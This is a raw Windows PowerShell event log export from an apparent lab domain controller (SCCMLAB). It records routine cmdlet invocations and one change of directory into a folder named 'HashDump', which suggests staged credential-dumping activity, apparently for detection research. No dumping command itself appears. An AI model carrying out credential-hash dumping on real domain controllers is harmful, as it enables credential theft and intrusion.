        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 27
        Command Name = Resolve-Path
        Command Type = Cmdlet
        Script Name = 
        Command Path = 
        Sequence Number = 54
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:25.760444800Z" />
    <EventRecordID>14207</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-423b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 27
        Command Name = Resolve-Path
        Command Type = Cmdlet
        Script Name = 
        Command Path = 
        Sequence Number = 54
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Resolve-Path): "Resolve-Path"
ParameterBinding(Resolve-Path): name="ErrorAction"; value="Ignore"
ParameterBinding(Resolve-Path): name="WarningAction"; value="Ignore"
ParameterBinding(Resolve-Path): name="InformationAction"; value="Ignore"
ParameterBinding(Resolve-Path): name="Verbose"; value="False"
ParameterBinding(Resolve-Path): name="Debug"; value="False"
ParameterBinding(Resolve-Path): name="Path"; value="Get*"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:22 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Set-StrictMode): "Set-StrictMode"
ParameterBinding(Set-StrictMode): name="Off"; value="True"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 25
        Command Name = Set-StrictMode
        Command Type = Cmdlet
        Script Name = C:\Program Files\WindowsPowerShell\Modules\PSReadline\2.0.0\PSReadLine.psm1
        Command Path = 
        Sequence Number = 52
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:22.718803300Z" />
    <EventRecordID>14206</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-3a3b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 25
        Command Name = Set-StrictMode
        Command Type = Cmdlet
        Script Name = C:\Program Files\WindowsPowerShell\Modules\PSReadline\2.0.0\PSReadLine.psm1
        Command Path = 
        Sequence Number = 52
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Set-StrictMode): "Set-StrictMode"
ParameterBinding(Set-StrictMode): name="Off"; value="True"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:22 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Out-Default): "Out-Default"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 23
        Command Name = 
        Command Type = Script
        Script Name = 
        Command Path = 
        Sequence Number = 50
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:22.717827300Z" />
    <EventRecordID>14205</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-353b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 23
        Command Name = 
        Command Type = Script
        Script Name = 
        Command Path = 
        Sequence Number = 50
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Out-Default): "Out-Default"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:22 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Set-Location): "Set-Location"
ParameterBinding(Set-Location): name="Path"; value=".\Users\vagrant\Downloads\Commands\HashDump\"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 23
        Command Name = Set-Location
        Command Type = Cmdlet
        Script Name = 
        Command Path = 
        Sequence Number = 48
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:22.717756400Z" />
    <EventRecordID>14204</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-363b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 23
        Command Name = Set-Location
        Command Type = Cmdlet
        Script Name = 
        Command Path = 
        Sequence Number = 48
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Set-Location): "Set-Location"
ParameterBinding(Set-Location): name="Path"; value=".\Users\vagrant\Downloads\Commands\HashDump\"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:22 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(PSConsoleHostReadLine): "PSConsoleHostReadLine"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 12
        Command Name = PSConsoleHostReadLine
        Command Type = Function
        Script Name = 
        Command Path = 
        Sequence Number = 46
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:22.715801400Z" />
    <EventRecordID>14203</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-233b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 12
        Command Name = PSConsoleHostReadLine
        Command Type = Function
        Script Name = 
        Command Path = 
        Sequence Number = 46
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(PSConsoleHostReadLine): "PSConsoleHostReadLine"
</Data>
  </EventData>
</Event>